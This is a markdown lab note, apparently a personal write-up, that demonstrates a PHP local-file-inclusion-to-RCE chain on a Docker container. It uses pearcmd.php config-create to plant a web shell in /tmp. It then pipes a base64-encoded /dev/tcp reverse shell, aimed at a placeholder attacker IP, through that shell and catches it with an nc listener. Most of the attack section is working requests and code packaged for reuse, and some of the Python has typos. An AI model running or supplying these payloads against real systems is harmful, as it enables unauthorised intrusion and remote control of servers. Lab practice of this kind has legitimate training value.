---
status: done
---

# Info and prereqs
- This only works on php version __<7.3__ 
- demo was performed on a docker instance
- LFI needs to be found first to get an RCE
# Build
To build the docker image, run:

```bash
docker build -t phplfi2rce .
```

# Run 
To run the docker instance, run:
```bash
docker run -p 8000:8000 phplfi2rce
```

# pwn tha box
- Now  open browser and go to
```http
http://localhost:8000
```
It will load normally, now try:
```http
http://localhost:8000?file=/etc/passwd
```
__LFI__ _sleek_...
- Now go to `phpinfo.php` on the page and search `$_SERVER['argv']` config variable.
This hold an array containing the url variables supplied by the user.
- Try supplying a query parameter like `?killer=eren`, and see it reflect
- `pearcmd.php` is located at  `/usr/lib/php/pearcmd.php`, you can use it invoke php functions using a command: `config-create` and supply the file path to `pearcmd.php` and the args of `function` and `dext file path`
- Try on thy burp

```http
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=echo(pwned)?>+/tmp/pwned.php
```
- This could work, but not always. So a better alt is to script the whole processs with python or use `curl` with som e variables to run some system commands on the docker instance, like:
```python 
# do the imports, start connection and all that stuff
...

cmd = "<?=die(system($_GET['c']))?>" # wrapping everything in the die() func prevents weird php stuff from hapenning
path = f"/index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/{cmd}+/tmp/pwned.php"
connection.request("GET", path)

response = response.read()

...
```
- save this python file - as maybe `pwn.py` and run it anytime we want to pwn.
- now, on the docker instance, verify:
```bash
docker ps # to get the docker instance id

docker exec -it <instance_id> /bin/bash # to get a shell from the instance so we can verify

ls /tmp/ # and you shall find your `pwned.php` file
cat /tmp/pwned.php # this would contain the malcode that runs the RCE, when we supply our commands that is
```
- now go to
```http
http://localhost/?file=/tmp/pwned.php
```
- This should show you some error about _system() not able to run commands because arguments aren't passed_. But thats good news.
- Now try:
```http
http://localhost/?file=/tmp/pwned.php?c=id
```
and __BOOM__ ==LFI 2 RCE== , we get the results of the `id` linux command.

Now we can feel free to escalate this to wetf we want, _and we are probably to drop into a root shell_ `¶(^-÷)`

--- 
some trick to get a `reverse shell` tho.
- go to [Revshells](https://www.revshells.com/) & grab a rev shell command; lets say
```bash
sh -i >& /dev/tcp/<ip>/<port> 0>&1
```
- use `bash -c` to run it (safer), base64 encode it.
```bash
echo 'bash -c "sh -i >& /dev/tcp/<ip>/<port> 0>&1"' | base64 -w 0
```
- copy the output and make a pwn cal from your `pwn.py`
```python

import urllib.parse 
...

payload = urllib.parse.qoute('') # paste your base64 encoded payload
payload_path = f"/index.php?file=/tmp/pwned.php&c=echo {payload}|base64 -d"

connection.request.("GET", payload_path)

...
```
- now listen on hacker box at `<port>` from revshell:
```bash
nc -lnvp <port>
```
- run `pwn.py` & __BOOM__, __LFI-RCE-revshell__ `¶(^¬+)`


---
#vulns #lfi2rce  #php 